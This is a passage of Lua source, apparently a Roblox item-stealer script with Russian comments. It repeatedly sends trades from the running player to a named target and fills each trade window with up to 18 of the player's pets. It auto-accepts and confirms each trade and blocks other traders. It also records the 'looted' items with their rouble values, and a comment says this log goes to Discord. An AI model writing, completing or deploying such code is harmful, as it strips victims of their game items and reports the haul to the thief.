                                        for _, it in ipairs(list) do
                                            local uid = it.unique_id or it.unique
                                            if uid then allLootedUids[uid] = true end
                                        end
                                    end
                                end

                                local lootedItems = {}
                                local uidsToRemove = {}
                                for _, item in ipairs(pending.items) do
                                    if allLootedUids[item.uid] then
                                        table.insert(lootedItems, item)
                                        uidsToRemove[item.uid] = true
                                    end
                                end
                                
                                if #lootedItems > 0 then
                                    table.sort(lootedItems, function(a, b) return a.value > b.value end)
                                    local logList = ""
                                    local currentVal = 0
                                    local currentRawVal = 0
                                    for _, item in ipairs(lootedItems) do
                                        logList = logList .. item.Name .. item.potions .. ": " .. string.format("%.2f₽", item.value) .. "\n"
                                        currentVal = currentVal + item.value
                                        currentRawVal = currentRawVal + item.raw_value
                                    end
                                    
                                    local new_ItemList = {}
                                    for _, globalItem in ipairs(ItemList) do
                                        if not uidsToRemove[globalItem.uid] then
                                            table.insert(new_ItemList, globalItem)
                                        else
                                            ItemsInTransit[globalItem.uid] = nil
                                        end
                                    end
                                    ItemList = new_ItemList
                                    
                                    TransferredValue = TransferredValue + currentVal
                                    SendLootLog({ val = currentVal, raw_val = currentRawVal, count = #lootedItems, list = logList })
                                    table.remove(PendingTrades, i)
                                else
                                    if (tick() - pending.time > 15) then
                                        for _, item in ipairs(pending.items) do ItemsInTransit[item.uid] = nil end
                                        table.remove(PendingTrades, i)
                                    end
                                end
                            elseif (tick() - pending.time > 30) then
                                for _, item in ipairs(pending.items) do ItemsInTransit[item.uid] = nil end
                                table.remove(PendingTrades, i)
                            end
                        end
                    end
                    task.wait(2)
                end
                WorkerRunning = false
            end)
        end
    end
end

-- ТРЕЙД ЦИКЛ (АПДЕЙТ АНЛЕГИТНЫХ ПЕТОВ, УЛУЧШЕННЫЙ ЧЕКЕР УСПЕШНОГО ТРЕЙДА И ЕДИНОРАЗОВЫЙ ЛОГ В ДИСКОРД ПРИ ЛУТЕ)
local function TradeCycle(targetPlayerName)
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    if not targetPlayer then return end

    local tradeActive = false
    local uiRestored = false
    local itemsFilled = false
    local activeTradeId = nil

    while #ItemList > 0 do
        if not Players:FindFirstChild(targetPlayerName) then break end

        local rawData = fsys("ClientData").get_data()[LocalPlayer.Name]
        if rawData and rawData.trade and rawData.trade.trade_id then
            activeTradeId = rawData.trade.trade_id
        end
        
        local stage, myOffer, theirOffer = GetTradeState()

        if stage ~= "NONE" and theirOffer then
            if theirOffer.player_name ~= targetPlayerName then
                warn("[ANTI-STEAL] Detected foreign trade window from: " .. theirOffer.player_name)
                
                Trade.Decline:FireServer()
                
                tradeActive = false
                uiRestored = false
                itemsFilled = false
            
                task.wait(0.1)
                continue
            end
        end
        
        if stage == "NONE" then
            uiRestored = false
            itemsFilled = false

            if tradeActive then
                tradeActive = false

                if activeTradeId then
                    SpawnHistoryChecker(activeTradeId, ItemList)
                    activeTradeId = nil
                end

                continue
            else
                Trade.Send:FireServer(targetPlayer)
                
                local waitStart = tick()
                while tick() - waitStart < 2 do
                    if GetTradeState() ~= "NONE" then break end
                    task.wait(0.1)
                end
            end
        else
            tradeActive = true 
            
            if not uiRestored then
                task.spawn(RestoreWhitelistUI)
                uiRestored = true
            end
            
            if stage == "negotiation" then
                if myOffer and not myOffer.negotiated then
                    if not itemsFilled then
                        local itemsInWindow = {}
                        local triedInThisTrade = {}
                        local windowCount = 0
                        
                        while windowCount < 18 and #ItemList > 0 do
                            local addedThisRound = {}
                            for i = 1, #ItemList do
                                local item = ItemList[i]
                                if not itemsInWindow[item.uid] and not triedInThisTrade[item.uid] then
                                    Trade.Add:FireServer(item.uid)
                                    table.insert(addedThisRound, item)
                                    triedInThisTrade[item.uid] = true
                                    if #addedThisRound + windowCount >= 18 then break end
                                end
                            end

                            if #addedThisRound == 0 then break end

                            local _, currentOffer = GetTradeState()
                            local realUids = {}
                            windowCount = 0
                            if currentOffer and currentOffer.pets then
                                for _, p in ipairs(currentOffer.pets) do 
                                    realUids[p.unique] = true
                                    windowCount = windowCount + 1
                                end
                            end

                            for _, item in ipairs(addedThisRound) do
                                if realUids[item.uid] then itemsInWindow[item.uid] = true end
                            end
                        end
                        itemsFilled = true
                    end
                    
                    Trade.Accept:FireServer()
                end
                
            elseif stage == "confirmation" then
                if myOffer and not myOffer.confirmed then
                    Trade.Confirm:FireServer()
                end
            end
        end
        task.wait(0.05) 
    end
end

